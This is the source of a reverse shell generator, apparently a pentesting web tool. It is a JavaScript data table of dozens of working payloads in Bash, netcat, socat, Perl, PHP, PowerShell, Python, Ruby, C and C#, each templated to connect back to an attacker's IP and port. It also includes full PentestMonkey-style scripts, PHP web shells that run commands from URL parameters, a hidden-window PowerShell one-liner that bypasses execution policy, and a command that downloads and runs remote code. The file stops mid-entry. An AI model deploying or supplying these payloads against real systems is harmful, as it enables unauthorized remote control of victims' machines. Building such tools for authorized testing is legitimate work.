// Reverse Shell Generator JavaScript
document.addEventListener('DOMContentLoaded', function() {
    initReverseShellGenerator();
});

// Shell data
const shellData = {
    reverse: [
        {
            name: "Bash -i",
            command: "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
            os: ["linux", "mac"],
            description: "Standard bash reverse shell"
        },
        {
            name: "Bash 196",
            command: "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
            os: ["linux", "mac"],
            description: "Bash using file descriptor 196"
        },
        {
            name: "Bash read line",
            command: "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
            os: ["linux", "mac"],
            description: "Bash with read line loop"
        },
        {
            name: "Bash 5",
            command: "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
            os: ["linux", "mac"],
            description: "Bash using file descriptor 5"
        },
        {
            name: "Bash UDP",
            command: "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
            os: ["linux", "mac"],
            description: "Bash UDP reverse shell"
        },
        {
            name: "nc mkfifo",
            command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
            os: ["linux", "mac"],
            description: "Netcat with named pipes"
        },
        {
            name: "nc -e",
            command: "nc {ip} {port} -e {shell}",
            os: ["linux", "mac"],
            description: "Traditional netcat with -e flag"
        },
        {
            name: "nc.exe -e",
            command: "nc.exe {ip} {port} -e cmd",
            os: ["windows"],
            description: "Windows netcat with -e flag"
        },
        {
            name: "BusyBox nc -e",
            command: "busybox nc {ip} {port} -e bash",
            os: ["linux"],
            description: "BusyBox netcat"
        },
        {
            name: "nc -c",
            command: "nc -c {shell} {ip} {port}",
            os: ["linux", "mac"],
            description: "Netcat with -c flag"
        },
        {
            name: "ncat -e",
            command: "ncat {ip} {port} -e {shell}",
            os: ["linux", "mac"],
            description: "Ncat with -e flag"
        },
        {
            name: "ncat.exe -e",
            command: "ncat.exe {ip} {port} -e cmd",
            os: ["windows"],
            description: "Windows ncat"
        },
        {
            name: "ncat UDP",
            command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
            os: ["linux", "mac"],
            description: "Ncat UDP with named pipes"
        },
        {
            name: "curl",
            command: "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null",
            os: ["linux", "mac"],
            description: "cURL telnet reverse shell"
        },
        {
            name: "rustcat",
            command: "rcat connect -s bash {ip} {port}",
            os: ["linux", "mac"],
            description: "Rustcat reverse shell"
        },
        {
            name: "C",
            command: "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"bash\", NULL};\n    execvp(\"bash\", argv);\n\n    return 0;       \n}",
            os: ["linux", "mac"],
            description: "C language reverse shell"
        },
        {
            name: "C Windows",
            command: "#include <winsock2.h>\r\n#include <stdio.h>\r\n#pragma comment(lib,\"ws2_32\")\r\n\r\nWSADATA wsaData;\r\nSOCKET Winsock;\r\nstruct sockaddr_in hax; \r\nchar ip_addr[16] = \"{ip}\"; \r\nchar port[6] = \"{port}\";            \r\n\r\nSTARTUPINFO ini_processo;\r\n\r\nPROCESS_INFORMATION processo_info;\r\n\r\nint main()\r\n{\r\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\r\n\r\n\r\n    struct hostent *host; \r\n    host = gethostbyname(ip_addr);\r\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n    hax.sin_family = AF_INET;\r\n    hax.sin_port = htons(atoi(port));\r\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\r\n\r\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r\n\r\n    memset(&ini_processo, 0, sizeof(ini_processo));\r\n    ini_processo.cb = sizeof(ini_processo);\r\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r\n\r\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\r\n\r\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r\n\r\n    return 0;\r\n}",
            os: ["windows"],
            description: "C Windows reverse shell"
        },
        {
            name: "C# TCP Client",
            command: "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"{ip}\", {port}))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"cmd\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
            os: ["linux", "windows"],
            description: "C# TCP client reverse shell"
        },
        {
            name: "C# Bash -i",
            command: "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n\tpublic static void Main(string[] args) {\n\t  Process proc = new System.Diagnostics.Process();\n\t  proc.StartInfo.FileName = \"bash\";\n\t  proc.StartInfo.Arguments = \"-c \\\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\\\"\";\n\t  proc.StartInfo.UseShellExecute = false;\n\t  proc.StartInfo.RedirectStandardOutput = true;\n\t  proc.Start();\n\n\t  while (!proc.StandardOutput.EndOfStream) {\n\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());\n\t  }\n\t}\n  }\n}\n",
            os: ["linux", "windows"],
            description: "C# bash reverse shell"
        },
        {
            name: "Haskell #1",
            command: "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2>&1 | nc {ip} {port} >/tmp/f\"",
            os: ["linux", "mac"],
            description: "Haskell reverse shell"
        },
        {
            name: "OpenSSL",
            command: "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
            os: ["linux", "mac"],
            description: "OpenSSL encrypted shell"
        },
        {
            name: "Perl",
            command: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'",
            os: ["linux", "mac"],
            description: "Perl reverse shell"
        },
        {
            name: "Perl no sh",
            command: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            os: ["linux", "mac"],
            description: "Perl without shell dependency"
        },
        {
            name: "Perl PentestMonkey",
            command: "#!/usr/bin/perl -w\n# perl-reverse-shell - A Reverse Shell implementation in PERL\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\n\nuse strict;\nuse Socket;\nuse FileHandle;\nuse POSIX;\nmy $VERSION = \"1.0\";\n\n# Where to send the reverse shell.  Change these.\nmy $ip = '{ip}';\nmy $port = {port};\n\n# Options\nmy $daemon = 1;\nmy $auth   = 0;\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n\n# Declarations\nmy $global_page = \"\";\nmy $fake_process_name = \"/usr/sbin/apache\";\n\n# Change the process name to be less conspicious\n$0 = \"[httpd]\";\n\n# Background and dissociate from parent process if required\nif ($daemon) {\n\tmy $pid = fork();\n\tif ($pid) {\n\t\tcgiexit(0); # parent exits\n\t}\n\n\tsetsid();\n\tchdir('/');\n\tumask(0);\n}\n\n# Make TCP connection for reverse shell\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n\tcgiprint(\"Sent reverse shell to $ip:$port\");\n\tcgiprintpage();\n} else {\n\tcgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n\tcgiexit();\t\n}\n\n# Redirect STDIN, STDOUT and STDERR to the TCP connection\nopen(STDIN, \">&SOCK\");\nopen(STDOUT,\">&SOCK\");\nopen(STDERR,\">&SOCK\");\n$ENV{'HISTFILE'} = '/dev/null';\nsystem(\"w;uname -a;id;pwd\");\nexec({\"bash\"} ($fake_process_name, \"-i\"));\n\n# Wrapper around print\nsub cgiprint {\n\tmy $line = shift;\n\t$line .= \"<p>\\n\";\n\t$global_page .= $line;\n}\n\n# Wrapper around exit\nsub cgiexit {\n\tcgiprintpage();\n\texit 0;\n}\n\n# Form HTTP response using all the messages gathered by cgiprint so far\nsub cgiprintpage {\n\tprint \"Content-Length: \" . length($global_page) . \"\\r\\nConnection: close\\r\\nContent-Type: text\\/html\\r\\n\\r\\n\" . $global_page;\n}",
            os: ["linux", "mac"],
            description: "Perl PentestMonkey reverse shell"
        },
        {
            name: "PHP exec",
            command: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"bash <&3 >&3 2>&3\");'",
            os: ["linux", "mac"],
            description: "PHP exec reverse shell"
        },
        {
            name: "PHP shell_exec",
            command: "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"bash <&3 >&3 2>&3\");'",
            os: ["linux", "mac"],
            description: "PHP shell_exec reverse shell"
        },
        {
            name: "PHP system",
            command: "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"bash <&3 >&3 2>&3\");'",
            os: ["linux", "windows", "mac"],
            description: "PHP system reverse shell"
        },
        {
            name: "PHP passthru",
            command: "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"bash <&3 >&3 2>&3\");'",
            os: ["linux", "mac"],
            description: "PHP passthru reverse shell"
        },
        {
            name: "PHP backticks",
            command: "php -r '$sock=fsockopen(\"{ip}\",{port});`bash <&3 >&3 2>&3`;'",
            os: ["linux", "windows", "mac"],
            description: "PHP backticks reverse shell"
        },
        {
            name: "PHP popen",
            command: "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"bash <&3 >&3 2>&3\", \"r\");'",
            os: ["linux", "windows", "mac"],
            description: "PHP popen reverse shell"
        },
        {
            name: "PHP proc_open",
            command: "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
            os: ["linux", "windows", "mac"],
            description: "PHP proc_open reverse shell"
        },
        {
            name: "PHP PentestMonkey",
            command: "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; bash -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>",
            os: ["linux", "windows", "mac"],
            description: "PHP PentestMonkey reverse shell"
        },
        {
            name: "PHP Ivan Sincek",
            command: "<?php\n// Copyright (c) 2020 Ivan Sincek\n// v2.3\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 => array('pipe', 'r'),\n        1 => array('pipe', 'w'),\n        2 => array('pipe', 'w')\n    );\n    private $buffer  = 1024;\n    private $clen    = 0;\n    private $error   = false;\n    public function __construct($addr, $port) {\n        $this->addr = $addr;\n        $this->port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        if (stripos(PHP_OS, 'LINUX') !== false) {\n            $this->os    = 'LINUX';\n            $this->shell = 'bash';\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\n            $this->os    = 'WINDOWS';\n            $this->shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) < 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid > 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n        } else if (posix_setsid() < 0) {\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        } else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0);\n        @umask(0);\n    }\n    private function dump($data) {\n        $data = str_replace('<', '&lt;', $data);\n        $data = str_replace('>', '&gt;', $data);\n        echo $data;\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) {\n            $this->error = true;\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) {\n            $this->error = true;\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    public function run() {\n        if ($this->detect() && !$this->daemonize()) {\n            $this->settings();\n            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false);\n                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false);\n                    }\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");\n                    do {\n                        $status = proc_get_status($process);\n                        if (feof($socket)) {\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break;\n                        }\n                        $streams = array(\n                            'read'   => array($socket, $pipes[1], $pipes[2]),\n                            'write'  => null,\n                            'except' => null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams > 0) {\n                            if ($this->os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }\n                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }\n                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }\n                            } else if ($this->os === 'WINDOWS') {\n                                if (in_array($socket, $streams['read'])) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }\n                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }\n                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }\n                            }\n                        }\n                    } while (!$this->error);\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                fclose($socket);\n            }\n        }\n    }\n}\necho '<pre>';\n$sh = new Shell('{ip}', {port});\n$sh->run();\nunset($sh);\necho '</pre>';\n?>",
            os: ["linux", "windows", "mac"],
            description: "PHP Ivan Sincek reverse shell"
        },
        {
            name: "PHP cmd",
            command: "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>",
            os: ["linux", "windows", "mac"],
            description: "PHP command web shell"
        },
        {
            name: "PHP cmd small",
            command: "<?=`$_GET[0]`?>",
            os: ["linux", "windows", "mac"],
            description: "PHP small command shell"
        },
        {
            name: "PowerShell #1",
            command: "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
            os: ["windows"],
            description: "PowerShell TCP client"
        },
        {
            name: "PowerShell #2",
            command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            os: ["windows"],
            description: "PowerShell one-liner"
        },
        {
            name: "PowerShell #3",
            command: "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
            os: ["windows"],
            description: "PowerShell hidden window"
        },
        {
            name: "PowerShell #4 (TLS)",
            command: "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
            os: ["windows"],
            description: "PowerShell with TLS"
        },
        {
            name: "Windows ConPty",
            command: "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
            os: ["windows"],
            description: "Windows ConPty shell"
        },
        {
            name: "Python #1",
            command: "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'",
            os: ["linux", "mac"],
            description: "Python with pty spawn"
        },
        {
            name: "Python #2",
            command: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
            os: ["linux", "mac"],
            description: "Python with subprocess"
        },
        {
            name: "Python3 #1",
            command: "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'",
            os: ["linux", "mac"],
            description: "Python3 with pty spawn"
        },
        {
            name: "Python3 #2",
            command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
            os: ["linux", "mac"],
            description: "Python3 with subprocess"
        },
        {
            name: "Python3 Windows",
            command: "import os,socket,subprocess,threading;\\ndef s2p(s, p):\\n    while True:\\n        data = s.recv(1024)\\n        if len(data) > 0:\\n            p.stdin.write(data)\\n            p.stdin.flush()\\n\\ndef p2s(s, p):\\n    while True:\\n        s.send(p.stdout.read(1))\\n\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"{ip}\",{port}))\\n\\np=subprocess.Popen([\"cmd\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\\n\\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\\ns2p_thread.daemon = True\\ns2p_thread.start()\\n\\np2s_thread = threading.Thread(target=p2s, args=[s, p])\\np2s_thread.daemon = True\\np2s_thread.start()\\n\\ntry:\\n    p.wait()\\nexcept KeyboardInterrupt:\\n    s.close()",
            os: ["windows"],
            description: "Python3 Windows with threading"
        },
        {
            name: "Python3 shortest",
            command: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'",
            os: ["linux"],
            description: "Python3 shortest version"
        },
        {
            name: "Ruby #1",
            command: "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
            os: ["linux", "mac"],
            description: "Ruby with spawn"
        },
        {
            name: "Ruby no sh",
            command: "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
            os: ["linux", "mac"],
            description: "Ruby without shell dependency"
        },
        {
            name: "socat #1",
            command: "socat TCP:{ip}:{port} EXEC:bash",
            os: ["linux", "mac"],
            description: "Socat TCP connection"
        },
        {
            name: "socat #2 (TTY)",
            command: "socat TCP:{ip}:{port} EXEC:'bash',pty,stderr,setsid,sigint,sane",
            os: ["linux", "mac"],
            description: "Socat with TTY"
        },
        {
            name: "sqlite3 nc mkfifo",
            command: "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f'",
            os: ["linux", "mac"],
            description: "SQLite3 with netcat"
        },
        {
            name: "node.js #1",
            command: "require('child_process').exec('nc -e bash {ip} {port}')",
            os: ["linux", "mac"],
            description: "Node.js with child_process"
        },
        {
            name: "node.js #2",
